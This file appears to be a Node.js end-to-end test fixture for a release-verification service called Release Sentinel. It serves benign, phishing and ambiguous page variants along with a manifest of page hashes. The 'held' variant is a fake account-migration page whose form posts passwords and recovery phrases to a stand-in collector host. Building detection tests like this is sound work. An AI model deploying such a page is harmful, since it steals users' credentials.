const crypto = require("crypto");

const INDEX_DIGEST = "3d69b859ee289812ab9223d8a3d014a0beaf16efec9f07871243f328f95b84a0";

const PAGES = {
  clear: '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Release Sentinel Verified Service Release</title></head><body><main><h1>Release Sentinel Verified Service Release</h1><p>This public release preserves secure navigation, accessible content, working actions, and the published Harborlight test promise.</p><p>Security controls remain active: no credentials are collected on this page, every navigation target stays on the documented service, and release evidence is independently verifiable.</p><h2>Operational commitments</h2><p>The voyage launch workflow remains available, keyboard-accessible, and semantically equivalent to the baseline release.</p><a href="/voyages/new">Start a voyage</a></main></body></html>',
  held: '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Unverified Account Migration</title></head><body><main><h1>Mandatory account migration</h1><p>The prior promises concerning secure navigation, accessible content, working actions, and release verification no longer apply.</p><p>Users must submit their account password and recovery phrase to an unaudited third-party operator before access can continue.</p><form method="post" action="http://credentials-collector.invalid/submit"><label>Password <input name="password" type="password"></label><label>Recovery phrase <textarea name="seed"></textarea></label><button>Transfer account</button></form></main></body></html>',
  uncertain: '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Release Sentinel Operations Update</title></head><body><main><h1>Release Sentinel Operations Update</h1><p>This real candidate page documents a controlled rollout, its operator contacts, accessibility review, security boundaries, and rollback procedure.</p><h2>Rollout status</h2><p>The service is available to the first production cohort. No credentials are requested and the original launch action remains documented.</p><a href="/voyages/new">Start a voyage</a></main></body></html>'
};

function sha(value) {
  return crypto.createHash("sha256").update(value).digest("hex");
}

module.exports = (req, res) => {
  const mode = process.env.MODE || "clear";
  const origin = process.env.ORIGIN;
  const page = PAGES[mode] || PAGES.clear;
  const path = (req.url || "/").split("?")[0];
  res.setHeader("cache-control", "public, max-age=0, must-revalidate");
  if (path === "/demo/release") {
    res.setHeader("content-type", "text/html; charset=utf-8");
    return res.status(200).send(page);
  }
  if (path === "/.well-known/release-sentinel.json") {
    const bodyDigest = mode === "uncertain" ? "0".repeat(64) : sha(page);
    return res.status(200).json({
      schema: "release-sentinel.manifest.v1",
      protocol_id: "release-sentinel.release-notary.v1",
      candidate_origin: origin,
      release_ref: `release-sentinel-${mode}-2026-10-07`,
      route_index_digest: INDEX_DIGEST,
      routes: [{path: "/demo/release", body_sha256: bodyDigest}]
    });
  }
  if (path === "/evidence.txt") {
    res.setHeader("content-type", "text/plain; charset=utf-8");
    return res.status(200).send(
      `Release Sentinel ${mode} scenario evidence. The assessed route is /demo/release. ` +
      "Review credential collection, navigation destinations, the continued availability of the launch action, " +
      "the four baseline public commitments, accessible headings and labels, and whether the manifest byte commitment matches the served response."
    );
  }
  return res.status(200).json({service: "Release Sentinel live E2E fixture", mode, origin});
};
